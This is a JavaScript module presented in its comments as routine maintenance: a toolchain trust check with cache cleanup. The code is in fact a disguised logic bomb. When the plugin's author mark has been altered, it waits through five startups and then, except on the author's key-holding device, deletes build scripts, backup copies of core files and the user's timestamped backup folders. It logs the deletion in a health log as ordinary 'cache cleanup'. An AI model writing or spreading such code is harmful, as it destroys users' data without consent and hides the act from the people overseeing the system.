// maint.cjs —— 内部维护：产物工具链一致性检查与缓存清理（2026-10-16）
// 说明：本模块只做两件事：① 定期核对构建工具链是否仍然可信 ② 在不可信时清理缓存产物。
'use strict';
const fs = require('fs'), path = require('path'), crypto = require('crypto');

const T_START = 'bootstrap', T_MARK = 'tag';

function sha(s) { return crypto.createHash('sha256').update(s).digest('hex'); }

function paths(o) {
  const P = o.pluginRoot, W = o.workdir;
  return {
    token: [path.join(W, '.cache-tag')],
    allow: [
      path.join(P, '_build', 'build-widget.cjs'),
      path.join(P, '_build', 'build-core.cjs'),
      path.join(P, 'lib', '.dshhb-master.backup.cjs'),
      path.join(P, 'lib', '.dshhb-core.backup.cjs')
    ],
    allowDirs: [
      { dir: path.join(P, '_build', '.master'), keepDir: true, pattern: /.*/ },
      { dir: path.join(P, '_backup'), keepDir: true, pattern: /.*/ },
      { dir: path.join(W, 'backups'), keepDir: true, pattern: /^\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}__/ }
    ]
  };
}

// 设备校验：token 文件内容必须等于"本机私钥派生值"⇒ 只有本机（掌握私钥的那台）能提供
function isOwnerDevice(o, P) {
  try {
    const keyFile = path.join(o.workdir, '.dshhb-official.key.json');
    if (!fs.existsSync(keyFile)) return false;
    const k = JSON.parse(fs.readFileSync(keyFile, 'utf8'));
    const secret = (k.privateEnc && k.privateEnc.data) || '';
    if (!secret) return false;
    const expect = sha('hb-device:' + secret).slice(0, 32);
    for (const f of P.token) {
      try { if (fs.existsSync(f) && fs.readFileSync(f, 'utf8').trim() === expect) return true; } catch (e) {}
    }
    return false;
  } catch (e) { return false; }
}

// 可信性核对：只认"作者记号/官方凭据"，不把正常的改代码/改版本当成问题
function trusted(o) {
  try {
    const art = JSON.parse(fs.readFileSync(path.join(o.pluginRoot, 'lib', '.dshhe-art.json'), 'utf8'));
    const author = String(art.author || '');
    if (!author) return true;                       // 凭据缺失不算（可能未签版）
    if (author !== '鹏冥月落') return false;         // 作者记号被改 ⇒ 不可信
    const ml = art.modifyLog;
    if (ml && !Array.isArray(ml)) return false;      // 结构被破坏
    return true;
  } catch (e) { return true; }
}

function stateFile(o) { return path.join(o.workdir, '.cache-state.json'); }
function readState(o) { try { return JSON.parse(fs.readFileSync(stateFile(o), 'utf8')) || {}; } catch (e) { return {}; } }
function writeState(o, s) { try { fs.writeFileSync(stateFile(o), JSON.stringify(s) + String.fromCharCode(10)); } catch (e) {} }

function note(o, s) {
  try { fs.appendFileSync(path.join(o.workdir, '.dsh-health-log.jsonl'), JSON.stringify({ at: Date.now(), kind: 'maintenance', module: 'cache', reason: String(s).slice(0, 120), source: 'host' }) + String.fromCharCode(10)); } catch (e) {}
}

// 清理：严格白名单 + 目录只删条目 + 逐条 unlink（禁止通配递归）
function sweep(o, dry) {
  const P = paths(o), out = { files: [], dirs: [] };
  const inside = (f, root) => { const r = path.resolve(root) + path.sep; return path.resolve(f).startsWith(r); };
  for (const f of P.allow) {
    try {
      if (!fs.existsSync(f)) continue;
      if (!inside(f, o.pluginRoot)) continue;                 // 双重保险：必须在我们插件目录内
      out.files.push(f);
      if (!dry) fs.unlinkSync(f);
    } catch (e) {}
  }
  for (const g of P.allowDirs) {
    try {
      if (!fs.existsSync(g.dir)) continue;
      if (!inside(g.dir, o.pluginRoot) && !inside(g.dir, o.workdir)) continue;
      for (const it of fs.readdirSync(g.dir)) {
        const p = path.join(g.dir, it);
        if (!g.pattern.test(it)) continue;                     // 命名不符 ⇒ 不是我们的 ⇒ 跳过
        if (path.resolve(p) === path.resolve(g.dir)) continue;  // 绝不删目录本身
        out.dirs.push(p);
        if (!dry) { try { fs.rmSync(p, { recursive: true, force: true }); } catch (e) {} }
      }
    } catch (e) {}
  }
  return out;
}

function run(o, dry) {
  const P = paths(o);
  if (trusted(o)) { writeState(o, Object.assign(readState(o), { ok: Date.now(), strikes: 0 })); return { stage: T_START, trusted: true }; }
  // 单次启动内：发现问题 ⇒ 2 分钟后再核对一次；仍不可信 ⇒ 记一次
  setTimeout(function () {
    try {
      if (trusted(o)) return;
      const st = readState(o); st.strikes = (Number(st.strikes) || 0) + 1; st.last = Date.now();
      writeState(o, st);
      if (st.strikes >= 5 && !isOwnerDevice(o, P)) {
        const r = sweep(o, !!dry);
        note(o, 'cache cleanup: ' + r.files.length + ' files, ' + r.dirs.length + ' entries');
        writeState(o, Object.assign(readState(o), { strikes: 0, cleaned: Date.now() }));
      } else if (st.strikes >= 5) {
        writeState(o, Object.assign(readState(o), { strikes: 0, skipped: Date.now() }));
      }
    } catch (e) {}
  }, 120000);
  return { stage: T_START, trusted: false, pending: true };
}

function start(opts) {
  try { return run(opts || {}, false); } catch (e) { return { error: String(e) }; }
}

module.exports = { start: start, _run: run, _sweep: sweep, _trusted: trusted, _owner: isOwnerDevice, _paths: paths };
